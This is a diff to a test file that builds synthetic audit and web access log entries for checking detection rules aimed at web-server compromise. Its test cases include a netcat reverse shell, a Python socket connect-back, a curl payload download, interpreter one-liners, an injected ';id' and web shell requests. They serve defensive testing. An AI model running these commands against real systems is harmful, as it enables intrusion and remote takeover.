@@ -25,13 +25,21 @@ def enc(arg):
     return arg.encode().hex().upper()
 
 
-def audit(runtime, exe, argv, ppid=812):
+# (arch, syscall) for each audited entry point: 64-bit execve, 64-bit
+# execveat, and the 32-bit execve table on an x86_64 kernel.
+EXECVE = ("c000003e", 59)
+EXECVEAT = ("c000003e", 322)
+EXECVE_32 = ("40000003", 11)
+
+
+def audit(runtime, exe, argv, ppid=812, call=EXECVE):
     uid, key = USERS[runtime]
+    arch, nr = call
     _serial[0] += 1
     msg = f"audit(1761310000.{_serial[0] % 1000:03d}:{_serial[0]})"
     comm = argv[0].rsplit("/", 1)[-1][:15]
     syscall = (
-        f"type=SYSCALL msg={msg}: arch=c000003e syscall=59 success=yes exit=0 "
+        f"type=SYSCALL msg={msg}: arch={arch} syscall={nr} success=yes exit=0 "
         f"a0=55d0c1e2a0 a1=55d0c1e2b8 a2=55d0c1e2d0 a3=0 items=2 ppid={ppid} "
         f"pid={_serial[0] + 3000} auid=4294967295 uid={uid} gid={uid} euid={uid} "
         f"suid={uid} fsuid={uid} egid={uid} sgid={uid} fsgid={uid} tty=(none) "
@@ -60,6 +68,8 @@ CASES = [
      audit("php", "/usr/bin/dash", SH + ["ping -c 1 127.0.0.1;id"])),
     ("php: id", "100520", audit("php", "/usr/bin/id", ["id"])),
     ("php: whoami", "100520", audit("php", "/usr/bin/whoami", ["whoami"])),
+    ("php: id via execveat", "100520", audit("php", "/usr/bin/id", ["id"], call=EXECVEAT)),
+    ("php: id via 32-bit execve", "100520", audit("php", "/usr/bin/id", ["id"], call=EXECVE_32)),
     ("php: curl download", "100521",
      audit("php", "/usr/bin/curl", ["curl", "-s", "http://10.0.0.5/x.sh", "-o", "/tmp/x.sh"])),
     ("php: bash /dev/tcp reverse shell (hex)", "100530",
@@ -76,9 +86,17 @@ CASES = [
     ("node: uname -a", "100520", audit("node", "/usr/bin/uname", ["uname", "-a"])),
     ("node: nc -e", "100531",
      audit("node", "/usr/bin/nc.traditional", ["nc", "-e", "/bin/sh", "10.0.0.5", "4444"])),
-    ("node: python one-liner", "100522",
+    ("node: python one-liner", "100523",
      audit("node", "/usr/bin/python3.12",
            ["python3", "-c", "import socket,os;s=socket.socket();s.connect(('10.0.0.5',4444))"])),
+    ("php: perl -e", "100523",
+     audit("php", "/usr/bin/perl", ["perl", "-e", "print qx(id)"])),
+    ("php: php -r", "100523",
+     audit("php", "/usr/bin/php8.3", ["php", "-r", "system('id');"])),
+    ("node: node -e", "100523",
+     audit("node", "/usr/bin/node", ["node", "-e", "require('child_process').execSync('id')"])),
+    ("php: interpreter running a script file", "100522",
+     audit("php", "/usr/bin/php8.3", ["php", "/var/www/html/cron.php"])),
     ("php: ps aux (stock 92604 overlap)", "100520", audit("php", "/usr/bin/ps", ["ps", "aux"])),
     ("node: lscpu (stock 92606 overlap)", "100520", audit("node", "/usr/bin/lscpu", ["lscpu"])),
     ("php: scp (stock 92603 overlap)", "100521",
@@ -94,6 +112,13 @@ CASES = [
      audit("php", "/usr/bin/dash", SH + ["rsync -e ssh /a backup:/b"])),
     ("fp: ssh -i is not sh -i", "100510",
      audit("php", "/usr/bin/dash", SH + ["GIT_SSH_COMMAND='ssh -i /var/www/.ssh/id' git pull"])),
+    # Known-good: PHP mail() runs sendmail through /bin/sh -c
+    ("php: mail() -> sendmail", "100511",
+     audit("php", "/usr/bin/dash", SH + ["/usr/sbin/sendmail -t -i"])),
+    ("php: mail() -> sendmail with -f sender", "100511",
+     audit("php", "/usr/bin/dash", SH + ["/usr/sbin/sendmail -t -i -fwordpress@example.com"])),
+    ("fp guard: sendmail with injected ;id stays a shell spawn", "100510",
+     audit("php", "/usr/bin/dash", SH + ["/usr/sbin/sendmail -t -i;id"])),
     # Web access logs
     ("web: system() payload", "100560",
      access("GET /index.php?page=system%28%27id%27%29")),
@@ -104,6 +129,13 @@ CASES = [
     ("web: php in uploads dir", "100561", access("GET /uploads/avatar.php")),
     ("web: php in uploads dir, 404 (no alert)", None, access("GET /uploads/avatar.php", 404)),
     ("web: cmd= parameter", "100562", access("GET /shell.php?cmd=ls")),
+    # Payloads stock rule 31104 also claims (cd%20, wget%), on 200 (-> 31106) and 404
+    ("web: payload also matched by stock 31104/31106", "100560",
+     access("GET /index.php?page=system%28%27cd%20/tmp%27%29")),
+    ("web: payload also matched by stock 31104, 404", "100560",
+     access("GET /index.php?page=system%28%27cd%20/tmp%27%29", 404)),
+    ("web: cmd= with wget (stock 31104 overlap)", "100562",
+     access("GET /shell.php?cmd=wget%20http://10.0.0.5/x.sh")),
 ]
 
 
